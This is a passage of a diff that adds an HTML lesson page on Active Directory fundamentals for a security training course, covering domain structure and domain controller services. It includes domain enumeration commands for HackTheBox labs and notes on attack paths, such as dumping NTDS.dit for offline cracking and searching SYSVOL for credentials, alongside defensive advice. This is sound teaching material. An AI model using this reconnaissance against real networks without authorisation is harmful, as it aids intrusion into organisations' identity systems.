@@ -1,0 +1,1588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Module 1 — Active Directory Fundamentals | CyberAcademy</title>
+<link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+
+<div class="layout">
+
+<!-- ═══════════════════════════════════════
+     SIDEBAR
+════════════════════════════════════════ -->
+<aside class="sidebar">
+  <div class="sidebar-brand">
+    <div class="brand-badge">
+      <span>⚡</span>CyberAcademy Pro
+    </div>
+    <div class="brand-title">Active Directory Fundamentals</div>
+    <div class="brand-subtitle">Module 1 of 8 · Beginner → Intermediate</div>
+  </div>
+
+  <div class="sidebar-progress">
+    <div class="progress-label">
+      <span>Progress</span>
+      <span id="progress-pct">0%</span>
+    </div>
+    <div class="progress-bar-outer">
+      <div class="progress-bar-inner" id="progress-bar"></div>
+    </div>
+  </div>
+
+  <div class="sidebar-search">
+    <div class="search-wrap">
+      <svg class="search-icon" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2">
+        <circle cx="9" cy="9" r="6"/><path d="M15 15l3 3"/>
+      </svg>
+      <input class="search-input" id="sidebar-search" type="text" placeholder="Search topics…"/>
+    </div>
+  </div>
+
+  <nav class="sidebar-nav">
+    <div class="nav-section-label">Table of Contents</div>
+    <div id="sidebar-nav"></div>
+  </nav>
+
+  <div class="sidebar-footer">
+    <button class="footer-btn" onclick="document.getElementById('quiz').scrollIntoView({behavior:'smooth'})">
+      🧠 Take Knowledge Check
+    </button>
+  </div>
+</aside>
+
+<!-- ═══════════════════════════════════════
+     MAIN CONTENT
+════════════════════════════════════════ -->
+<main class="main-content">
+
+<!-- ───────────────────────────────────
+     HERO
+──────────────────────────────────── -->
+<section id="hero" class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow-1"></div>
+  <div class="hero-glow-2"></div>
+  <div class="hero-inner">
+    <div class="hero-eyebrow">
+      <span class="hero-dot"></span>
+      Module 1 · Active Directory Fundamentals
+    </div>
+    <h1 class="hero-title">
+      Master <span class="highlight">Active Directory</span><br>from the Ground Up
+    </h1>
+    <p class="hero-desc">
+      Understand how Microsoft's enterprise identity system works — from objects and authentication to attack paths and defenses. The foundation of every Windows security certification.
+    </p>
+    <div class="hero-meta">
+      <span class="hero-meta-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        ~4 hours
+      </span>
+      <span class="hero-meta-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>
+        9 Chapters
+      </span>
+      <span class="hero-meta-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+        Beginner Friendly
+      </span>
+      <span class="hero-meta-item">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        OSCP · CEH · CISSP Aligned
+      </span>
+    </div>
+    <a href="#what-is-ad" class="hero-cta" onclick="event.preventDefault();document.getElementById('what-is-ad').scrollIntoView({behavior:'smooth'})">
+      Start Learning
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+    </a>
+    <div class="hero-stats">
+      <div class="hero-stat">
+        <div class="hero-stat-num" data-count="95" data-suffix="%">0%</div>
+        <div class="hero-stat-label">Enterprise networks run Windows AD</div>
+      </div>
+      <div class="hero-stat">
+        <div class="hero-stat-num" data-count="8">0</div>
+        <div class="hero-stat-label">Core concepts covered in depth</div>
+      </div>
+      <div class="hero-stat">
+        <div class="hero-stat-num" data-count="8">0</div>
+        <div class="hero-stat-label">Quiz questions with explanations</div>
+      </div>
+    </div>
+  </div>
+  <div class="scroll-hint">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M19 12l-7 7-7-7"/></svg>
+    Scroll to begin
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 1 — WHAT IS ACTIVE DIRECTORY
+════════════════════════════════════════ -->
+<section id="what-is-ad" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 01</div>
+    <div class="section-tag tag-blue">🌐 Foundation</div>
+    <h2 class="section-title">What is Active Directory?</h2>
+    <p class="section-subtitle">The enterprise backbone that controls who you are, what you can access, and how your computer talks to the network.</p>
+  </div>
+
+  <!-- Definition -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-blue">📖</div>
+      <div><div class="block-title">Definition</div><div class="block-subtitle">The official, beginner-friendly explanation</div></div>
+    </div>
+    <div class="card card-blue">
+      <p class="definition-text">
+        <strong>Active Directory (AD)</strong> is a <em>directory service</em> developed by Microsoft that runs on Windows Server. Think of it as a <strong>massive, intelligent phonebook</strong> for your entire company — it stores information about every <strong>user, computer, group, printer, and policy</strong> in the organization, and uses that information to control <strong>who can log in, what they can access, and what rules apply to their machine</strong>.
+      </p>
+      <div style="margin-top:16px;display:flex;flex-wrap:wrap;gap:8px;">
+        <span class="tag-pill pill-blue">Directory Service</span>
+        <span class="tag-pill pill-indigo">Authentication</span>
+        <span class="tag-pill pill-purple">Authorization</span>
+        <span class="tag-pill pill-green">LDAP-Based</span>
+        <span class="tag-pill pill-gray">Windows Server</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Why it exists -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-indigo">💡</div>
+      <div><div class="block-title">Why Microsoft Created AD</div><div class="block-subtitle">The problem it solves</div></div>
+    </div>
+    <div class="grid-2">
+      <div class="callout callout-red">
+        <span class="callout-icon">🔥</span>
+        <div class="callout-body">
+          <h4>The Problem (Before AD)</h4>
+          <p>Every computer had its own local user database. An IT admin managing 5,000 computers had to create the same user account <strong>5,000 times</strong>. Password changes were a nightmare. No central control existed. Security was impossible to enforce consistently.</p>
+        </div>
+      </div>
+      <div class="callout callout-green">
+        <span class="callout-icon">✅</span>
+        <div class="callout-body">
+          <h4>The Solution (AD)</h4>
+          <p>Microsoft released Active Directory with <strong>Windows 2000 Server</strong>. One central database. Create a user once, they can log into any computer. Enforce security policies across every machine from one place. Change a password once — it works everywhere.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Analogy -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-amber">🌍</div>
+      <div><div class="block-title">Real-World Analogy</div><div class="block-subtitle">Makes the abstract concrete</div></div>
+    </div>
+    <div class="card">
+      <div class="analogy-card">
+        <div class="analogy-icon-wrap">🏢</div>
+        <div class="analogy-content">
+          <strong>Active Directory is like a Corporate Badge System</strong>
+          <p>Imagine a large hospital. Every employee gets a <strong>badge</strong>. That badge has your name, role (doctor, nurse, admin), department, and access level. At every door — pharmacy, ICU, server room — the badge reader checks <strong>a central database</strong>: "Is this person allowed in here?" That central database <em>is</em> Active Directory. The badge is your domain user account. The door readers are the computers and applications checking your permissions.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- AD Hierarchy SVG Diagram -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-blue">📊</div>
+      <div><div class="block-title">Visual Diagram — AD Hierarchy</div><div class="block-subtitle">How Active Directory is structured</div></div>
+    </div>
+    <div class="diagram-wrap">
+      <svg id="ad-tree-svg" viewBox="0 0 760 440" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;">
+        <defs>
+          <linearGradient id="blue-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" style="stop-color:#2563EB"/>
+            <stop offset="100%" style="stop-color:#4F46E5"/>
+          </linearGradient>
+          <linearGradient id="purple-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" style="stop-color:#7C3AED"/>
+            <stop offset="100%" style="stop-color:#4F46E5"/>
+          </linearGradient>
+          <linearGradient id="green-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" style="stop-color:#059669"/>
+            <stop offset="100%" style="stop-color:#0EA5E9"/>
+          </linearGradient>
+          <filter id="soft-shadow">
+            <feDropShadow dx="0" dy="2" stdDeviation="4" flood-color="rgba(0,0,0,0.12)"/>
+          </filter>
+        </defs>
+
+        <!-- LEVEL 0 — Forest -->
+        <line class="tree-edge" x1="380" y1="56" x2="380" y2="100" stroke="#CBD5E1" stroke-width="2"/>
+
+        <!-- LEVEL 1 — Domain -->
+        <line class="tree-edge" x1="380" y1="134" x2="185" y2="178" stroke="#CBD5E1" stroke-width="2"/>
+        <line class="tree-edge" x1="380" y1="134" x2="575" y2="178" stroke="#CBD5E1" stroke-width="2"/>
+
+        <!-- LEVEL 2 — OUs from Domain 1 -->
+        <line class="tree-edge" x1="185" y1="212" x2="100" y2="260" stroke="#CBD5E1" stroke-width="2"/>
+        <line class="tree-edge" x1="185" y1="212" x2="270" y2="260" stroke="#CBD5E1" stroke-width="2"/>
+
+        <!-- LEVEL 3 — Objects -->
+        <line class="tree-edge" x1="100" y1="294" x2="60"  y2="350" stroke="#E2E8F0" stroke-width="1.5"/>
+        <line class="tree-edge" x1="100" y1="294" x2="140" y2="350" stroke="#E2E8F0" stroke-width="1.5"/>
+        <line class="tree-edge" x1="270" y1="294" x2="230" y2="350" stroke="#E2E8F0" stroke-width="1.5"/>
+        <line class="tree-edge" x1="270" y1="294" x2="310" y2="350" stroke="#E2E8F0" stroke-width="1.5"/>
+
+        <!-- Forest Node -->
+        <g class="tree-node-g float">
+          <rect x="300" y="8" width="160" height="48" rx="12" fill="url(#blue-grad)" filter="url(#soft-shadow)"/>
+          <text x="380" y="27" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="rgba(255,255,255,.75)" font-weight="600" letter-spacing=".08em">FOREST</text>
+          <text x="380" y="44" text-anchor="middle" font-family="system-ui,sans-serif" font-size="13" fill="#fff" font-weight="700">🌲 contoso.com</text>
+        </g>
+
+        <!-- Domain nodes -->
+        <g class="tree-node-g float float-delay-1">
+          <rect x="110" y="100" width="150" height="44" rx="10" fill="url(#purple-grad)" filter="url(#soft-shadow)"/>
+          <text x="185" y="117" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="rgba(255,255,255,.75)" font-weight="600" letter-spacing=".06em">CHILD DOMAIN</text>
+          <text x="185" y="133" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#fff" font-weight="700">🏢 corp.contoso.com</text>
+        </g>
+        <g class="tree-node-g float float-delay-2">
+          <rect x="500" y="100" width="150" height="44" rx="10" fill="url(#purple-grad)" filter="url(#soft-shadow)"/>
+          <text x="575" y="117" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="rgba(255,255,255,.75)" font-weight="600" letter-spacing=".06em">CHILD DOMAIN</text>
+          <text x="575" y="133" text-anchor="middle" font-family="system-ui,sans-serif" font-size="12" fill="#fff" font-weight="700">🏢 asia.contoso.com</text>
+        </g>
+
+        <!-- OU nodes -->
+        <g class="tree-node-g">
+          <rect x="44" y="258" width="112" height="36" rx="8" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.5"/>
+          <text x="100" y="272" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#1E40AF" font-weight="600">📁 OU</text>
+          <text x="100" y="285" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#2563EB" font-weight="700">Engineering</text>
+        </g>
+        <g class="tree-node-g">
+          <rect x="214" y="258" width="112" height="36" rx="8" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.5"/>
+          <text x="270" y="272" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#1E40AF" font-weight="600">📁 OU</text>
+          <text x="270" y="285" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#2563EB" font-weight="700">HR &amp; Finance</text>
+        </g>
+
+        <!-- Leaf objects -->
+        <g class="tree-node-g">
+          <rect x="28" y="344" width="66" height="50" rx="8" fill="#F0FDF4" stroke="#22C55E" stroke-width="1.5"/>
+          <text x="61" y="364" text-anchor="middle" font-size="16">👤</text>
+          <text x="61" y="382" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#15803D" font-weight="600">Users</text>
+        </g>
+        <g class="tree-node-g">
+          <rect x="108" y="344" width="66" height="50" rx="8" fill="#FFF7ED" stroke="#F59E0B" stroke-width="1.5"/>
+          <text x="141" y="364" text-anchor="middle" font-size="16">💻</text>
+          <text x="141" y="382" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#D97706" font-weight="600">Computers</text>
+        </g>
+        <g class="tree-node-g">
+          <rect x="196" y="344" width="66" height="50" rx="8" fill="#F5F3FF" stroke="#7C3AED" stroke-width="1.5"/>
+          <text x="229" y="364" text-anchor="middle" font-size="16">👥</text>
+          <text x="229" y="382" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#7C3AED" font-weight="600">Groups</text>
+        </g>
+        <g class="tree-node-g">
+          <rect x="276" y="344" width="66" height="50" rx="8" fill="#FEF2F2" stroke="#EF4444" stroke-width="1.5"/>
+          <text x="309" y="364" text-anchor="middle" font-size="16">📋</text>
+          <text x="309" y="382" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#DC2626" font-weight="600">GPO</text>
+        </g>
+
+        <!-- DC Box on right -->
+        <g class="tree-node-g float float-delay-3">
+          <rect x="510" y="230" width="170" height="80" rx="12" fill="linear-gradient(135deg,#0F172A,#1E293B)" stroke="#334155" stroke-width="1.5"/>
+          <rect x="510" y="230" width="170" height="80" rx="12" fill="#0F172A" opacity=".95"/>
+          <text x="595" y="255" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#94A3B8" font-weight="600" letter-spacing=".06em">DOMAIN CONTROLLER</text>
+          <text x="595" y="272" text-anchor="middle" font-size="18">🖥️</text>
+          <text x="595" y="291" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#60A5FA" font-weight="600">DC01.corp.contoso.com</text>
+          <text x="595" y="305" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#9FE870">● NTDS.dit  ● DNS  ● Kerberos  ● LDAP</text>
+        </g>
+        <line x1="575" y1="144" x2="595" y2="230" stroke="#4F46E5" stroke-width="1.5" stroke-dasharray="4,3"/>
+
+        <!-- Legend -->
+        <g transform="translate(520, 360)">
+          <rect width="200" height="70" rx="8" fill="#F8FAFC" stroke="#E2E8F0"/>
+          <text x="100" y="16" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#64748B" font-weight="700" letter-spacing=".07em">LEGEND</text>
+          <rect x="10" y="24" width="10" height="10" rx="2" fill="#2563EB"/>
+          <text x="26" y="33" font-family="system-ui,sans-serif" font-size="10" fill="#334155">Forest / Domain</text>
+          <rect x="10" y="40" width="10" height="10" rx="2" fill="#EFF6FF" stroke="#2563EB"/>
+          <text x="26" y="49" font-family="system-ui,sans-serif" font-size="10" fill="#334155">Organizational Unit (OU)</text>
+          <rect x="10" y="56" width="10" height="10" rx="2" fill="#F0FDF4" stroke="#22C55E"/>
+          <text x="26" y="65" font-family="system-ui,sans-serif" font-size="10" fill="#334155">Objects (Users, Computers…)</text>
+        </g>
+      </svg>
+      <div class="diagram-label">Active Directory Logical Structure — Forest → Domain → OU → Objects</div>
+    </div>
+  </div>
+
+  <!-- Real AD Example -->
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-green">🏢</div>
+      <div><div class="block-title">Real Enterprise Example</div></div>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;color:var(--text-2);margin-bottom:16px;">
+        Contoso Corporation has 12,000 employees across 8 countries. Their Active Directory setup:
+      </p>
+      <div class="step-flow">
+        <div class="step-item">
+          <div class="step-line"></div>
+          <div class="step-num">1</div>
+          <div class="step-content">
+            <h4>Forest: contoso.com</h4>
+            <p>Top-level container. Contains all domains. Security boundary. One schema shared across all domains.</p>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-line"></div>
+          <div class="step-num">2</div>
+          <div class="step-content">
+            <h4>Domains: corp.contoso.com, asia.contoso.com, eu.contoso.com</h4>
+            <p>Regional divisions. Each has its own Domain Controllers. Trust relationships allow cross-domain authentication.</p>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-line"></div>
+          <div class="step-num">3</div>
+          <div class="step-content">
+            <h4>OUs: Engineering, HR, Finance, IT, Marketing</h4>
+            <p>Departments organized as OUs. GPOs applied per-OU. IT admins delegate control at OU level.</p>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">4</div>
+          <div class="step-content">
+            <h4>Objects: 12,000 users, 15,000 computers, 800+ groups</h4>
+            <p>Every device, every person, every service account is an object. All managed from one central location.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- HTB Checkpoint -->
+  <div class="content-block">
+    <div class="htb-card">
+      <div class="htb-header">
+        <span class="htb-badge">🚩 HTB Checkpoint</span>
+        <span class="htb-title">Active Directory in Penetration Testing Labs</span>
+      </div>
+      <p class="htb-body">
+        When you start a <strong>HackTheBox Pro Lab</strong> (Offshore, RastaLabs, Dante) or an AD-focused machine, you'll always begin by <strong>enumerating the domain</strong>. Your first commands:
+      </p>
+      <div class="htb-tips">
+        <div class="htb-tip">
+          <span class="htb-tip-icon">▶</span>
+          <span><code>net user /domain</code> — List all domain users from a joined machine</span>
+        </div>
+        <div class="htb-tip">
+          <span class="htb-tip-icon">▶</span>
+          <span><code>net group /domain</code> — List all domain groups</span>
+        </div>
+        <div class="htb-tip">
+          <span class="htb-tip-icon">▶</span>
+          <span><code>systeminfo | findstr /i domain</code> — Confirm you're on a domain</span>
+        </div>
+        <div class="htb-tip">
+          <span class="htb-tip-icon">▶</span>
+          <span><strong>Goal:</strong> Find the domain name → find DCs → enumerate users → escalate privileges</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Attacker / Defender -->
+  <div class="content-block">
+    <div class="perspective-split">
+      <div class="perspective-card attacker">
+        <div class="perspective-title">👹 Attacker's Perspective</div>
+        <ul class="perspective-list">
+          <li>AD is the ultimate prize — compromise the DC = own the entire domain</li>
+          <li>AD stores password hashes in NTDS.dit — gold mine for credential attacks</li>
+          <li>Misconfigured AD permissions (ACLs) provide lateral movement paths</li>
+          <li>AD trusts between domains can allow cross-domain attacks</li>
+          <li>Kerberoasting, AS-REP Roasting, Pass-the-Hash all target AD</li>
+        </ul>
+      </div>
+      <div class="perspective-card defender">
+        <div class="perspective-title">🛡️ Defender's Perspective</div>
+        <ul class="perspective-list">
+          <li>Harden Domain Controllers — limit who can access them physically and remotely</li>
+          <li>Enable audit logging on all DC events (logon, object changes)</li>
+          <li>Use tiered administration model (Tier 0/1/2)</li>
+          <li>Monitor for LDAP queries from non-admin accounts</li>
+          <li>Enable Protected Users security group for privileged accounts</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Summary -->
+  <div class="content-block">
+    <div class="summary-card">
+      <div class="summary-title">✅ Section Summary</div>
+      <div class="summary-list">
+        <div class="summary-item"><div class="summary-check">✓</div><span>Active Directory is Microsoft's central directory service for managing enterprise identities</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>It stores users, computers, groups, policies, and more in a hierarchical structure</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>Structure: Forest → Domain → OU → Objects</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>AD solves the problem of managing thousands of machines with one central authority</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>95%+ of enterprise environments use AD — making it critical for security professionals</span></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 2 — DOMAIN CONTROLLER
+════════════════════════════════════════ -->
+<section id="domain-ctrl" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 02</div>
+    <div class="section-tag tag-indigo">🖥️ Core Infrastructure</div>
+    <h2 class="section-title">The Domain Controller</h2>
+    <p class="section-subtitle">The brain of Active Directory. The most critical server in any Windows network — and the most targeted.</p>
+  </div>
+
+  <div class="content-block">
+    <div class="card card-blue">
+      <p class="definition-text">
+        A <strong>Domain Controller (DC)</strong> is a Windows Server running the <em>Active Directory Domain Services (AD DS)</em> role. It is the <strong>central authority</strong> that authenticates users and computers, stores the AD database, enforces policies, and replicates data to other DCs. Without a DC, users cannot log in to the domain.
+      </p>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-indigo">⚙️</div>
+      <div><div class="block-title">Services Running on a DC</div></div>
+    </div>
+    <div class="accordion">
+      <div class="accordion-item">
+        <button class="accordion-trigger">
+          <span>🔐</span> Kerberos Key Distribution Center (KDC)
+          <svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+        </button>
+        <div class="accordion-panel">
+          <div class="accordion-body">
+            <p>The KDC issues <strong>Ticket Granting Tickets (TGTs)</strong> and <strong>Service Tickets</strong> for Kerberos authentication. When you log in, your password hash is used to prove your identity to the KDC, which issues you a TGT — your "passport" for the session. Every subsequent service access uses this ticket rather than your password.</p>
+          </div>
+        </div>
+      </div>
+      <div class="accordion-item">
+        <button class="accordion-trigger">
+          <span>📂</span> LDAP (Lightweight Directory Access Protocol)
+          <svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+        </button>
+        <div class="accordion-panel">
+          <div class="accordion-body">
+            <p>LDAP (port <code>389</code>, LDAPS port <code>636</code>) is the protocol used to <strong>query and modify</strong> the AD directory. Applications use LDAP to search for users, groups, and attributes. Attackers use LDAP enumeration to map the entire AD structure. Commands like <code>ldapsearch</code> and tools like BloodHound use LDAP extensively.</p>
+          </div>
+        </div>
+      </div>
+      <div class="accordion-item">
+        <button class="accordion-trigger">
+          <span>🌐</span> DNS (Domain Name System)
+          <svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+        </button>
+        <div class="accordion-panel">
+          <div class="accordion-body">
+            <p>AD requires DNS to locate DCs and services. The DC runs an <strong>AD-integrated DNS zone</strong>, meaning DNS records are stored in AD and replicated automatically. Clients use DNS SRV records like <code>_kerberos._tcp.domain.com</code> to find the DC. DNS poisoning can redirect authentication traffic — a critical attack vector.</p>
+          </div>
+        </div>
+      </div>
+      <div class="accordion-item">
+        <button class="accordion-trigger">
+          <span>📋</span> Group Policy (SYSVOL Share)
+          <svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+        </button>
+        <div class="accordion-panel">
+          <div class="accordion-body">
+            <p>All GPO files are stored in the <code>SYSVOL</code> shared folder on the DC (<code>\\DC\SYSVOL\domain\Policies\</code>). When a machine boots or a user logs in, it contacts the DC, downloads applicable GPOs, and applies them. SYSVOL is replicated between DCs using DFSR. Attackers look for credentials and scripts stored in SYSVOL.</p>
+          </div>
+        </div>
+      </div>
+      <div class="accordion-item">
+        <button class="accordion-trigger">
+          <span>🗄️</span> NTDS.dit — The AD Database
+          <svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+        </button>
+        <div class="accordion-panel">
+          <div class="accordion-body">
+            <p>The heart of AD. Stored at <code>C:\Windows\NTDS\NTDS.dit</code>. Contains every object in the domain — all users, their password hashes (NT hashes, Kerberos keys), groups, computers, and more. Protected by the SYSTEM key. If an attacker dumps NTDS.dit + SYSTEM hive, they can crack every password in the domain offline.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DC Architecture SVG -->
+  <div class="content-block">
+    <div class="diagram-wrap" style="background:linear-gradient(160deg,#F8FAFF,#EEF2FF);">
+      <svg viewBox="0 0 740 380" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;">
+        <defs>
+          <linearGradient id="dc-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" style="stop-color:#0F172A"/>
+            <stop offset="100%" style="stop-color:#1E293B"/>
+          </linearGradient>
+          <filter id="glow"><feGaussianBlur stdDeviation="3" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        </defs>
+
+        <!-- Server body -->
+        <rect x="260" y="80" width="220" height="240" rx="16" fill="url(#dc-grad)" filter="url(#soft-shadow)"/>
+        <rect x="272" y="92" width="196" height="12" rx="4" fill="#334155"/>
+        <rect x="280" y="90" width="4" height="4" rx="2" fill="#9FE870"/>
+        <rect x="290" y="90" width="4" height="4" rx="2" fill="#F59E0B"/>
+        <rect x="300" y="90" width="4" height="4" rx="2" fill="#EF4444"/>
+        <text x="370" y="126" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#94A3B8" font-weight="700" letter-spacing=".08em">DOMAIN CONTROLLER</text>
+        <text x="370" y="145" text-anchor="middle" font-size="22">🖥️</text>
+        <text x="370" y="166" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#60A5FA">DC01.corp.local</text>
+
+        <!-- Service chips -->
+        <rect x="280" y="180" width="82" height="26" rx="6" fill="#1E3A8A"/>
+        <text x="321" y="197" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#93C5FD" font-weight="600">Kerberos KDC</text>
+
+        <rect x="378" y="180" width="82" height="26" rx="6" fill="#312E81"/>
+        <text x="419" y="197" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#A5B4FC" font-weight="600">LDAP :389</text>
+
+        <rect x="280" y="216" width="82" height="26" rx="6" fill="#064E3B"/>
+        <text x="321" y="233" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#6EE7B7" font-weight="600">DNS :53</text>
+
+        <rect x="378" y="216" width="82" height="26" rx="6" fill="#7F1D1D"/>
+        <text x="419" y="233" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#FCA5A5" font-weight="600">NetLogon</text>
+
+        <rect x="280" y="252" width="180" height="26" rx="6" fill="#1C1917"/>
+        <text x="370" y="269" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#9FE870" font-weight="700">📂 NTDS.dit Database</text>
+
+        <rect x="280" y="288" width="180" height="26" rx="6" fill="#1C1917"/>
+        <text x="370" y="305" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#FCD34D" font-weight="600">📁 SYSVOL Share (GPOs)</text>
+
+        <!-- Connections on left: User/Computer connecting -->
+        <!-- User -->
+        <g class="float">
+          <rect x="60" y="120" width="130" height="64" rx="12" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.5"/>
+          <text x="125" y="143" text-anchor="middle" font-size="18">👤</text>
+          <text x="125" y="162" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#1E40AF" font-weight="700">Domain User</text>
+          <text x="125" y="177" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#3B82F6">alice@corp.local</text>
+        </g>
+        <!-- Computer -->
+        <g class="float float-delay-1">
+          <rect x="60" y="220" width="130" height="64" rx="12" fill="#F0FDF4" stroke="#22C55E" stroke-width="1.5"/>
+          <text x="125" y="243" text-anchor="middle" font-size="18">💻</text>
+          <text x="125" y="262" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#15803D" font-weight="700">Domain Computer</text>
+          <text x="125" y="277" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#22C55E">WS01.corp.local</text>
+        </g>
+
+        <!-- Arrows from clients to DC -->
+        <line x1="190" y1="152" x2="258" y2="192" stroke="#2563EB" stroke-width="1.5" stroke-dasharray="5,3"/>
+        <polygon points="258,192 248,186 252,196" fill="#2563EB"/>
+        <text x="220" y="168" font-family="system-ui,sans-serif" font-size="9" fill="#3B82F6">Auth Request</text>
+
+        <line x1="190" y1="252" x2="258" y2="240" stroke="#22C55E" stroke-width="1.5" stroke-dasharray="5,3"/>
+        <polygon points="258,240 248,234 252,244" fill="#22C55E"/>
+        <text x="202" y="256" font-family="system-ui,sans-serif" font-size="9" fill="#16A34A">GPO Pull</text>
+
+        <!-- Right side: App Server -->
+        <g class="float float-delay-2">
+          <rect x="550" y="140" width="130" height="64" rx="12" fill="#FFF7ED" stroke="#F59E0B" stroke-width="1.5"/>
+          <text x="615" y="163" text-anchor="middle" font-size="18">🗄️</text>
+          <text x="615" y="182" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#D97706" font-weight="700">File Server</text>
+          <text x="615" y="197" text-anchor="middle" font-family="system-ui,sans-serif" font-size="10" fill="#F59E0B">FS01.corp.local</text>
+        </g>
+        <line x1="480" y1="210" x2="550" y2="185" stroke="#F59E0B" stroke-width="1.5" stroke-dasharray="5,3"/>
+        <polygon points="550,185 542,179 544,190" fill="#F59E0B"/>
+        <text x="498" y="196" font-family="system-ui,sans-serif" font-size="9" fill="#D97706">Ticket Check</text>
+
